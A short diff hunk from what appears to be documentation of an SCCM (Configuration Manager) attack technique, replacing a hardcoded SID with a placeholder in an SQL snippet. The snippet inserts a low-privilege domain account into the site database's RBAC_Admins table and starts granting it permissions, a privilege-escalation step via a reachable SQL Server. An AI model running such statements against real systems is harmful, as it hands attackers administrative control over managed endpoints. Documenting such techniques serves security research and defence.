@@ -70,7 +70,7 @@ The following example assumes the attacker can query a third-party SQL Server wi
       USE CM_PS1;
       INSERT INTO RBAC_Admins
         (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
-        VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,
+        VALUES (/* target user's actual SID in binary form */,
                 ''MAYYHEM\lowpriv'', 0, 0, '''', '''', '''', '''', ''PS1'');
       INSERT INTO RBAC_ExtendedPermissions
         (AdminID, RoleID, ScopeID, ScopeTypeID)
